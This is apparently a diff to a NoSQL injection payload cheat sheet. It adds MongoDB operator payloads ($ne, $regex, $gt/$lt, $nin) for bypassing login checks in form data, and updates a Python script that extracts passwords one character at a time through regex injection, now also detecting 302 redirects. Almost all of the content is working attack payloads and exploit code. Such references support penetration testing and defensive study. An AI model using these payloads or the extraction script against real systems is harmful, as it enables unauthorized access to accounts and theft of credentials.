@@ -27,8 +27,11 @@
 Basic authentication bypass using not equal ($ne) or greater ($gt)
 
 ```json
-in URL
+in DATA
 username[$ne]=toto&password[$ne]=toto
+login[$regex]=a.*&pass[$ne]=lol
+login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
 
 in JSON
 {"username": {"$ne": null}, "password": {"$ne": null}}
@@ -89,8 +92,8 @@ while True:
     for c in string.printable:
         if c not in ['*','+','.','?','|']:
             payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
-            r = requests.post(u, data = payload, headers = headers, verify = False)
-            if 'OK' in r.text:
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if 'OK' in r.text or r.status_code == 302:
                 print("Found one more char : %s" % (password+c))
                 password += c
 ```
